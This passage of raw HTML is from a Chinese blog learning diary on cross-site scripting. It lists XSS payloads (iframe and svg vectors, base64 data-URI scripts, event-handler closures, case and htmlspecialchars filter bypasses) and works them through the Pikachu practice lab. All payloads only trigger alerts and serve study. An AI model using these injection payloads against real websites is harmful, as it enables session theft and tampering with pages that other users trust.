+<figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf">&lt;form method<span class="hljs-operator">=</span>postaction<span class="hljs-operator">=</span><span class="hljs-string">&quot;data:text/html;base64,PHNjcmlwdD5hbGVydCgneHNzJyk8L3NjcmlwdD4=&quot;</span>&gt;<br></code></pre></td></tr></table></figure>
+</blockquote>
+<h4 id="lt-iframe-gt-标签"><a href="#lt-iframe-gt-标签" class="headerlink" title="&lt;iframe&gt;标签"></a><code>&lt;iframe&gt;</code>标签</h4><h5 id="XSS利用方式1-2"><a href="#XSS利用方式1-2" class="headerlink" title="XSS利用方式1"></a>XSS利用方式1</h5><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">iframe</span> <span class="hljs-attr">src</span>=<span class="hljs-string">javascript:alert(</span>&#x27;<span class="hljs-attr">xss</span>&#x27;);<span class="hljs-attr">height</span>=<span class="hljs-string">5width</span>=<span class="hljs-string">1000/</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">iframe</span>&gt;</span><br></code></pre></td></tr></table></figure>
+
+<h5 id="XSS利用方式2-3"><a href="#XSS利用方式2-3" class="headerlink" title="XSS利用方式2"></a>XSS利用方式2</h5><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">iframe</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;data:text/html,&lt;script&gt;alert(&#x27;xss&#x27;)&lt;/script&gt;&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">iframe</span>&gt;</span><br></code></pre></td></tr></table></figure>
+
+<!--原code-->
+
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">&lt;iframe <span class="hljs-attribute">src</span>=<span class="hljs-string">&quot;data:text/html;base64,&lt;script&gt;alert(&#x27;xss&#x27;)&lt;/script&gt;&quot;</span>&gt;<br></code></pre></td></tr></table></figure>
+
+<!--base64编码-->
+
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">&lt;iframe <span class="hljs-attribute">src</span>=<span class="hljs-string">&quot;data:text/html;base64,PHNjcmlwdD5hbGVydCgneHNzJyk8L3NjcmlwdD4=&quot;</span>&gt;<br></code></pre></td></tr></table></figure>
+
+<h5 id="XSS利用方式3-2"><a href="#XSS利用方式3-2" class="headerlink" title="XSS利用方式3"></a>XSS利用方式3</h5><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">&lt;<span class="hljs-selector-tag">iframe</span> <span class="hljs-attribute">src</span>=<span class="hljs-string">&quot;aaa&quot;</span>onmouseover=<span class="hljs-built_in">alert</span>(<span class="hljs-string">&#x27;xss&#x27;</span>)/&gt;&lt;iframe&gt;<br></code></pre></td></tr></table></figure>
+
+<h5 id="XSS利用方式3-3"><a href="#XSS利用方式3-3" class="headerlink" title="XSS利用方式3"></a>XSS利用方式3</h5><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">iframe</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;javascript:prompt(`xss`)&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">iframe</span>&gt;</span><br></code></pre></td></tr></table></figure>
+
+<h4 id="svg-lt-gt-标签"><a href="#svg-lt-gt-标签" class="headerlink" title="svg&lt;&gt;标签"></a><code>svg&lt;&gt;</code>标签</h4><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">svg</span> <span class="hljs-attr">onload</span>=<span class="hljs-string">alert(1)</span>&gt;</span>﻿<br></code></pre></td></tr></table></figure>
+
+<h3 id="puikachu-xss练习"><a href="#puikachu-xss练习" class="headerlink" title="puikachu_xss练习"></a>puikachu_xss练习</h3><h4 id="反射型xss-get"><a href="#反射型xss-get" class="headerlink" title="反射型xss(get)"></a>反射型xss(get)</h4><p><img src="/2022/10/31/learning%20diary/XSS%E8%B7%A8%E7%AB%99%E6%94%BB%E5%87%BB/image-20221101214524558.png" srcset="/img/loading.gif" lazyload alt="image-20221101214524558"></p>
+<p>字数限制</p>
+<p><img src="/2022/10/31/learning%20diary/XSS%E8%B7%A8%E7%AB%99%E6%94%BB%E5%87%BB/image-20221101214546067.png" srcset="/img/loading.gif" lazyload alt="image-20221101214546067"></p>
+<p><img src="/2022/10/31/learning%20diary/XSS%E8%B7%A8%E7%AB%99%E6%94%BB%E5%87%BB/image-20221101214603354.png" srcset="/img/loading.gif" lazyload alt="image-20221101214603354"></p>
+<h4 id="反射型xss-post"><a href="#反射型xss-post" class="headerlink" title="反射型xss(post)"></a>反射型xss(post)</h4><p><img src="/2022/10/31/learning%20diary/XSS%E8%B7%A8%E7%AB%99%E6%94%BB%E5%87%BB/image-20221101214652487.png" srcset="/img/loading.gif" lazyload alt="image-20221101214652487"></p>
+<p>查找注入点,</p>
+<h4 id="存储型xss"><a href="#存储型xss" class="headerlink" title="存储型xss"></a>存储型xss</h4><p><img src="/2022/10/31/learning%20diary/XSS%E8%B7%A8%E7%AB%99%E6%94%BB%E5%87%BB/image-20221101223625022.png" srcset="/img/loading.gif" lazyload alt="image-20221101223625022"></p>
+<p>刷新再次访问<img src="/2022/10/31/learning%20diary/XSS%E8%B7%A8%E7%AB%99%E6%94%BB%E5%87%BB/image-20221101223730730.png" srcset="/img/loading.gif" lazyload alt="image-20221101223730730"></p>
+<p>数据库中已经有注入语句,当访问该链接时,数据库拿出认为可信的数据返回给前段,前段执行恶意代码</p>
+<h4 id="dom型xss"><a href="#dom型xss" class="headerlink" title="dom型xss"></a>dom型xss</h4><p>随便输入查看</p>
+<p><img src="/2022/10/31/learning%20diary/XSS%E8%B7%A8%E7%AB%99%E6%94%BB%E5%87%BB/image-20221101224031179.png" srcset="/img/loading.gif" lazyload alt="image-20221101224031179"></p>
+<p>弹出了可点链接 f12查看源码</p>
+<p><img src="/2022/10/31/learning%20diary/XSS%E8%B7%A8%E7%AB%99%E6%94%BB%E5%87%BB/image-20221101224128169.png" srcset="/img/loading.gif" lazyload alt="image-20221101224128169"></p>
+<p><img src="/2022/10/31/learning%20diary/XSS%E8%B7%A8%E7%AB%99%E6%94%BB%E5%87%BB/image-20221101224216584.png" srcset="/img/loading.gif" lazyload alt="image-20221101224216584"></p>
+<p>$str即为输入的语句,初次构造闭包</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js">&lt;a href=<span class="hljs-string">&#x27;&#x27;</span> onclick=<span class="hljs-string">&quot;alert(&#x27;xss&#x27;)&quot;</span>&gt;&lt;<span class="hljs-regexp">/a&gt;&lt;a href=&#x27;&#x27;&gt;what do you see?&lt;/</span>a&gt;;<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js">$str=<span class="hljs-string">&#x27; onclick=&quot;alert(&#x27;</span>xss<span class="hljs-string">&#x27;)&quot;&gt;点我&lt;/a&gt;;&lt;a href=&#x27;</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="/2022/10/31/learning%20diary/XSS%E8%B7%A8%E7%AB%99%E6%94%BB%E5%87%BB/image-20221101224516769.png" srcset="/img/loading.gif" lazyload alt="image-20221101224516769"></p>
+<p>多写了一个<a>标签</a></p>
+<p>再次构造</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js">&lt;a href=<span class="hljs-string">&#x27;&#x27;</span> onclick=<span class="hljs-string">&quot;alert(&#x27;xss&#x27;)&quot;</span>&gt;,<span class="hljs-string">&#x27;&gt;what do you see?&lt;/a&gt;;</span><br></code></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs js">&lt;img src=<span class="hljs-string">&quot;#&quot;</span> onmouseover=<span class="hljs-string">&quot;alert(&#x27;xss&#x27;)&quot;</span>&gt;&lt;<span class="hljs-regexp">/img&gt;&#x27;&gt;what do you see?&lt;/</span>a&gt;;<br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&#x27;&#x27;</span> <span class="hljs-attr">onmouseover</span>=<span class="hljs-string">&quot;alert(&#x27;xss&#x27;)&quot;</span>&gt;</span>&#x27;&gt;what do you see?<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span></span><br></code></pre></td></tr></table></figure>
+
+<p>多出来的’&gt;会被当做字符 只要前面的标签是完整的即可</p>
+<p><img src="/2022/10/31/learning%20diary/XSS%E8%B7%A8%E7%AB%99%E6%94%BB%E5%87%BB/image-20221101224702370.png" srcset="/img/loading.gif" lazyload alt="image-20221101224702370"></p>
+<h4 id="DOMxss"><a href="#DOMxss" class="headerlink" title="DOMxss"></a>DOMxss</h4><p><img src="/2022/10/31/learning%20diary/XSS%E8%B7%A8%E7%AB%99%E6%94%BB%E5%87%BB/image-20221101224920977.png" srcset="/img/loading.gif" lazyload alt="image-20221101224920977"></p>
+<p>???????做题都不放过我????? 只要做得题够多 悲伤就追不上我</p>
+<p><img src="/2022/10/31/learning%20diary/XSS%E8%B7%A8%E7%AB%99%E6%94%BB%E5%87%BB/image-20221101225058834.png" srcset="/img/loading.gif" lazyload alt="image-20221101225058834"></p>
+<p>初步判断往事随风一句话可以构造xss</p>
+<p><img src="/2022/10/31/learning%20diary/XSS%E8%B7%A8%E7%AB%99%E6%94%BB%E5%87%BB/image-20221101230752697.png" srcset="/img/loading.gif" lazyload alt="image-20221101230752697"></p>
+<p>构造语句$str&#x3D;’onmouseover&#x3D;”alert(1)”&gt;</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs js">&lt;a href=<span class="hljs-string">&#x27;&#x27;</span>&gt;<br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;#&quot;</span> <span class="hljs-attr">onmouseover</span>=<span class="hljs-string">&quot;alert(&#x27;xss&#x27;)&quot;</span>&gt;</span>&#x27;&gt;就让往事都随风,都随风吧<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span></span><br></code></pre></td></tr></table></figure>
+
+<p><img src="/2022/10/31/learning%20diary/XSS%E8%B7%A8%E7%AB%99%E6%94%BB%E5%87%BB/image-20221101230734554.png" srcset="/img/loading.gif" lazyload alt="image-20221101230734554"></p>
+<h4 id="XSS盲打"><a href="#XSS盲打" class="headerlink" title="XSS盲打"></a>XSS盲打</h4><p><img src="/2022/10/31/learning%20diary/XSS%E8%B7%A8%E7%AB%99%E6%94%BB%E5%87%BB/image-20221101233742618.png" srcset="/img/loading.gif" lazyload alt="image-20221101233742618"></p>
+<p>直接上代码</p>
+<p><img src="/2022/10/31/learning%20diary/XSS%E8%B7%A8%E7%AB%99%E6%94%BB%E5%87%BB/image-20221101233754097.png" srcset="/img/loading.gif" lazyload alt="image-20221101233754097"></p>
+<p>没有回显,源代码中也没有相关数据</p>
+<p>然而当管理员登入后台的时候,恶意代码被执行</p>
+<p><img src="/2022/10/31/learning%20diary/XSS%E8%B7%A8%E7%AB%99%E6%94%BB%E5%87%BB/image-20221101233908102.png" srcset="/img/loading.gif" lazyload alt="image-20221101233908102"></p>
+<h4 id="XSS过滤"><a href="#XSS过滤" class="headerlink" title="XSS过滤"></a>XSS过滤</h4><p><img src="/2022/10/31/learning%20diary/XSS%E8%B7%A8%E7%AB%99%E6%94%BB%E5%87%BB/image-20221102151732364.png" srcset="/img/loading.gif" lazyload alt="image-20221102151732364"></p>
+<p><img src="/2022/10/31/learning%20diary/XSS%E8%B7%A8%E7%AB%99%E6%94%BB%E5%87%BB/image-20221102151739901.png" srcset="/img/loading.gif" lazyload alt="image-20221102151739901"></p>
+<p>script应该是被过滤掉了</p>
+<SCRipt>alert(1)</SCRipt>
+
+<p>大小写绕过</p>
+<img src="/2022/10/31/learning%20diary/XSS%E8%B7%A8%E7%AB%99%E6%94%BB%E5%87%BB/image-20221102151903679.png" srcset="/img/loading.gif" lazyload alt="image-20221102151903679" style="zoom:150%;">
+
+<h5 id="htmlspecialchars-绕过"><a href="#htmlspecialchars-绕过" class="headerlink" title="htmlspecialchars 绕过"></a>htmlspecialchars 绕过</h5><p>htmlspecialchars()函数用来把预定义字符转换为html实体 </p>
+<p><img src="https://img-blog.csdnimg.cn/20210314142540889.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>就用单引号闭包 ‘ onmouseover&#x3D;’alert(&#x2F;xss&#x2F;)’</p>
+<p><img src="/2022/10/31/learning%20diary/XSS%E8%B7%A8%E7%AB%99%E6%94%BB%E5%87%BB/image-20221103201445728.png" srcset="/img/loading.gif" lazyload alt="image-20221103201445728"></p>
+<h5 id="xss-href"><a href="#xss-href" class="headerlink" title="xss-href"></a>xss-href</h5><p>a href 标签里面可以用javascript:js_method 直接执行js代码</p>
+<p>javascript:alert(&#x2F;xss&#x2F;)</p>
+<p><img src="/2022/10/31/learning%20diary/XSS%E8%B7%A8%E7%AB%99%E6%94%BB%E5%87%BB/image-20221103204033588.png" srcset="/img/loading.gif" lazyload alt="image-20221103204033588"></p>
+<h5 id="xss-动态js输出"><a href="#xss-动态js输出" class="headerlink" title="xss-动态js输出"></a>xss-动态js输出</h5><p>代码审计</p>
+<p><img src="/2022/10/31/learning%20diary/XSS%E8%B7%A8%E7%AB%99%E6%94%BB%E5%87%BB/image-20221103210826667.png" srcset="/img/loading.gif" lazyload alt="image-20221103210826667"></p>
+<p><img src="/2022/10/31/learning%20diary/XSS%E8%B7%A8%E7%AB%99%E6%94%BB%E5%87%BB/image-20221103210926034.png" srcset="/img/loading.gif" lazyload alt="image-20221103210926034"></p>
+<p>如果$jsvar变量中有标签,会和前面的<script>形成闭合</p>
+<p>将用户输入动态的调用到js中是不安全的</p>
+<p>'</script><script>alert(/xss/)</script><script></p>
+<p><img src="/XSS%E8%B7%A8%E7%AB%99%E6%94%BB%E5%87%BB/image-20221103211318678.png" srcset="/img/loading.gif" lazyload alt="image-20221103211318678"></p>
+<p><img src="/XSS%E8%B7%A8%E7%AB%99%E6%94%BB%E5%87%BB/image-20221103211339797.png" srcset="/img/loading.gif" lazyload alt="image-20221103211339797"></p>
+<p>形成了多个script闭包</p>
+</script></p>
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>XSS跨站式脚本攻击</div>
+      <div>http://example.com/2022/10/31/learning diary/XSS跨站攻击/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>Author</div>
+          <div>John Doe</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>Posted on</div>
+          <div>October 31, 2022</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>Licensed under</div>
+          <div>
+            
+              
+              
+                <a target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - Attribution">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2022/11/03/learning%20diary/CSRF/" title="CSRF客户端请求伪造">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">CSRF客户端请求伪造</span>
+                        <span class="visible-mobile">Previous</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2022/10/31/learning%20diary/php%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" title="PHP序列化与反序列化">
+                        <span class="hidden-mobile">PHP序列化与反序列化</span>
+                        <span class="visible-mobile">Next</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;Table of Contents</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">Search</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">Keyword</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">Blog works best with JavaScript enabled</div>
+  </noscript>
+</body>
+</html>
